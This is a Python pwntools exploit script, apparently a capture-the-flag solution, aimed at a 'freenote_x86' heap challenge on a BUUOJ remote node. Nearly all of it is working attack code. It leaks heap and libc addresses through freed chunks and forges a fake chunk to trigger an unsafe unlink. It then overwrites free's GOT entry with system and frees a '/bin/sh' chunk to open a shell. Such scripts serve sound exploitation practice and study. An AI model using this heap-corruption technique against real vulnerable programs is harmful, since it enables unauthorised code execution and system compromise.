from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + libc.search('/bin/sh').next()

	return (system, binsh)

s       = lambda data               :p.send(str(data))
sa      = lambda delim,data         :p.sendafter(str(delim), str(data))
sl      = lambda data               :p.sendline(str(data))
sla     = lambda delim,data         :p.sendlineafter(str(delim), str(data))
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,'\0'))
uu64    = lambda data               :u64(data.ljust(8,'\0'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context.log_level = 'DEBUG'
binary = './freenote_x86'
context.binary = binary
elf = ELF(binary)
p = remote('node3.buuoj.cn', 28585) if argv[1]=='r' else process(binary)
#libc = ELF('/lib/i386-linux-gnu/libc.so.6')
libc = ELF('./libc-2.23.so')

# start
def list():
	sla(':','1')

def add(len,content='a'):
	sla(':','2')
	sla('note:',str(len))
	sa('note:',content)

def edit(index,len,content):
	sla(':','3')
	sla('number:',str(index))
	sla('note:',str(len))
	sa('note:',content)

def delete(index):
	sla(':','4')
	sla('number:',str(index))

for i in range(4):
	add(1)
delete(0)
delete(2)
add(4,'dead') # 0
add(4,'dead') # 2
list()
ru('0. dead') # 0->bk = heap+0xc18+2*0x88
heap = uu32(ru('\n'))-0xd28
leak('heap',heap)

ru('2. dead') # 2->bk = main_arena+48
base = uu32(ru('\n'))-48-libc.sym['__malloc_hook']-0x18
leak('base',base)
for i in range(3,-1,-1):
	delete(i)

# chunk0:prev_size,size,fd,bk,data
fake = flat(0,0x81,heap+0x18-0xc,heap+0x18-0x8,'a'*0x70)
# chunk1:prev_size,size,data; chunk2:prev_size,size,data
fake += flat(0x80,0x80,'a'*0x78,0x80,0x81,'a'*0x78)
add(len(fake),fake)
delete(1) # unlink chunk0

system = base + libc.sym['system']
# len(payload) == len(fake)
payload = flat(1,1,4,elf.got['free'],1,8,heap+0xab).ljust(len(fake),'a')
edit(0,len(fake),payload)
edit(0,4,p32(system))
edit(1,8,'/bin/sh\x00')
delete(1)
# end

itr()
